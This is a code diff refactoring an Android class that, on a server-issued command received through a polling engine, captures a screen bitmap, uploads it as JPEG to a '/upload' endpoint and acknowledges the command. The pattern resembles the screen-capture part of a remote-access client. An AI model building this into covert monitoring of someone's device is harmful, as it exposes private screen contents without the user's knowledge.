@@ -16,79 +16,53 @@ import okhttp3.Response;
 public class ScreenCaptureSender {
 
     private final String baseUrl;
-    private final HttpPollingEngine pollingEngine;
-
     private final OkHttpClient client = new OkHttpClient();
+    private final HttpPollingEngine engine;
 
-    public ScreenCaptureSender(String baseUrl, HttpPollingEngine pollingEngine) {
+    public ScreenCaptureSender(String baseUrl, HttpPollingEngine engine) {
         this.baseUrl = baseUrl;
-        this.pollingEngine = pollingEngine;
+        this.engine = engine;
     }
 
     public void send(Bitmap bitmap, int commandId) {
-
         new Thread(() -> {
-
             try {
                 ByteArrayOutputStream stream = new ByteArrayOutputStream();
-
                 bitmap.compress(Bitmap.CompressFormat.JPEG, 70, stream);
                 byte[] bytes = stream.toByteArray();
-                stream.close();
 
-                // ───── upload ─────
-                try {
-                    Request uploadRequest = new Request.Builder()
-                            .url(baseUrl + "/upload")
-                            .post(RequestBody.create(bytes, MediaType.parse("image/jpeg")))
-                            .build();
+                // upload
+                Request upload = new Request.Builder()
+                        .url(baseUrl + "/upload")
+                        .post(RequestBody.create(bytes, MediaType.parse("image/jpeg")))
+                        .build();
 
-                    try (Response response = client.newCall(uploadRequest).execute()) {
-                        if (!response.isSuccessful()) {
-                            Log.e("ScreenSender", "upload failed");
-                        }
-                    }
-
-                } catch (Exception e) {
-                    Log.e("ScreenSender", "upload error", e);
+                try (Response r = client.newCall(upload).execute()) {
+                    Log.d("Sender", "Uploaded");
                 }
 
-                // ───── ACK ВСЕГДА ─────
-                try {
-                    JSONObject ackJson = new JSONObject();
-                    ackJson.put("id", commandId);
+                // ACK
+                JSONObject json = new JSONObject();
+                json.put("id", commandId);
+                json.put("status", "done");
 
-                    Request ackRequest = new Request.Builder()
-                            .url(baseUrl + "/ack")
-                            .post(RequestBody.create(
-                                    ackJson.toString(),
-                                    MediaType.parse("application/json")
-                            ))
-                            .build();
+                Request ack = new Request.Builder()
+                        .url(baseUrl + "/ack")
+                        .post(RequestBody.create(
+                                json.toString(),
+                                MediaType.parse("application/json")))
+                        .build();
 
-                    try (Response response = client.newCall(ackRequest).execute()) {
-                        Log.d("ScreenSender", "ACK sent: " + commandId);
-                    }
-
-                } catch (Exception e) {
-                    Log.e("ScreenSender", "ack error", e);
-                }
+                client.newCall(ack).execute();
 
             } catch (Exception e) {
-                Log.e("ScreenSender", "fatal error", e);
+                Log.e("Sender", "Error", e);
             } finally {
-
-                try {
-                    if (bitmap != null && !bitmap.isRecycled()) {
-                        bitmap.recycle();
-                    }
-                } catch (Exception e) {
-                    Log.e("ScreenSender", "recycle error", e);
+                if (bitmap != null && !bitmap.isRecycled()) {
+                    bitmap.recycle();
                 }
-
-                pollingEngine.onScreenSent();
+                engine.onScreenSent();
             }
-
         }).start();
     }
 }
